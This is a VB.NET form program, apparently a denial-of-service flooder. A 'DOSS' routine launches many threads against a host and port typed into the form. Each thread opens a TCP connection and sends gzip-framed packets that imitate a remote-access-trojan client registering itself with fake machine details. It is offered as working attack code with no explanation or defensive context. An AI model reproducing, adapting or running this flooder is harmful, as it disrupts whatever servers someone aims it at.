Public Class Form1
    Public SPL_DATA As String = "x0D0x"
    Public OBJ As String = "<Object>"
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click


        Dim s As New Threading.Thread(AddressOf DOSS)

        s.Start()



    End Sub
    Dim cc As Object = New Object()
    Dim ii As Integer = 0
    Private Sub yyyyy()
        Try


            SyncLock cc
                Dim Client As New Net.Sockets.TcpClient
                Client.Client.Connect(TextBox1.Text, CInt(TextBox2.Text))
                Client.Client.ReceiveTimeout = -1
                Client.Client.SendTimeout = -1
                Client.Client.Poll(-1, Net.Sockets.SelectMode.SelectWrite)

                Dim pk As String = TextBox1.Text + ":" + TextBox2.Text + ":" + "JDKFJ" + ":" + "JDKFJ" + ":" + "JDKFJ" + ":" + "JDKFJ" + ":" + "JDKFJ"

                Dim bByte As Byte() = FormatPacket("-1", Encoding.GetBytes(pk))

                Client.Client.SendBufferSize = bByte.Length

                Client.Client.BeginSend(bByte, 0, bByte.Length, Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf EndSend), Client)


                Dim s0 As String = OBJ + SPL_DATA + "TES" + SPL_DATA + "win" + SPL_DATA + "win - " + ii.ToString + SPL_DATA + "v1.0" + SPL_DATA + "DOSS" + SPL_DATA + "TEST" + SPL_DATA + "IT" + SPL_DATA + "-1" + SPL_DATA + "2"
                ii += 1
                Dim bByte1 As Byte() = FormatPacket("getinfo", Encoding.GetBytes(s0))

                Client.Client.SendBufferSize = bByte1.Length

                Client.Client.BeginSend(bByte1, 0, bByte1.Length, Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf EndSend), Client)

            End SyncLock

            Threading.Thread.Sleep(1)
        Catch ex As Exception

        End Try
    End Sub
    Private Sub DOSS()
        Dim i As Integer = 0
        Do
            i += 1
            Dim s As New Threading.Thread(AddressOf yyyyy)
            s.Start()
            If i >= CInt(NumericUpDown1.Value) Then
                Exit Do
            End If
        Loop
    End Sub
    Private Shared Sub EndSend(ByVal ar As IAsyncResult)

        Try

            Dim Client As Net.Sockets.TcpClient = CType(ar.AsyncState, Net.Sockets.TcpClient)

            Client.Client.EndSend(ar)

        Catch ex As Exception

        End Try

    End Sub
    Private Function FormatPacket(ByVal Strings As String, ByVal bByte As Byte()) As Byte()

        Dim MS As IO.MemoryStream

        MS = New IO.MemoryStream

        Dim B As Byte() = CGzip(bByte)

        Dim S As Byte() = CGzip(Encoding().GetBytes(Strings))

        Dim LS As Byte() = Encoding().GetBytes(S.Length)

        Dim CH As Byte() = Encoding().GetBytes(ChrW(0))

        Dim LB As Byte() = Encoding().GetBytes(B.Length)

        MS.Write(LS, 0, LS.Length)

        MS.Write(CH, 0, CH.Length)

        MS.Write(LB, 0, LB.Length)

        MS.Write(CH, 0, CH.Length)

        MS.Write(S, 0, S.Length)

        MS.Write(B, 0, B.Length)

        Dim F As Byte() = MS.ToArray

        MS.Dispose()

        Return F

    End Function
    Public Function CGzip(ByVal b() As Byte) As Byte()
        Using memory As IO.MemoryStream = New IO.MemoryStream()
            If memory.CanSeek Then
                memory.Seek(0, IO.SeekOrigin.Begin)
            End If
            Using gzip As IO.Compression.GZipStream = New IO.Compression.GZipStream(memory, IO.Compression.CompressionMode.Compress, True)
                gzip.Write(b, 0, b.Length)
            End Using
            Return memory.ToArray()
        End Using
    End Function
    Public Function Encoding() As System.Text.Encoding
        Dim i As System.Text.Encoding = System.Text.Encoding.UTF8
        Return i
    End Function

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Threading.ThreadPool.SetMaxThreads(250, 250)

        Threading.ThreadPool.SetMinThreads(250, 250)
    End Sub
End Class
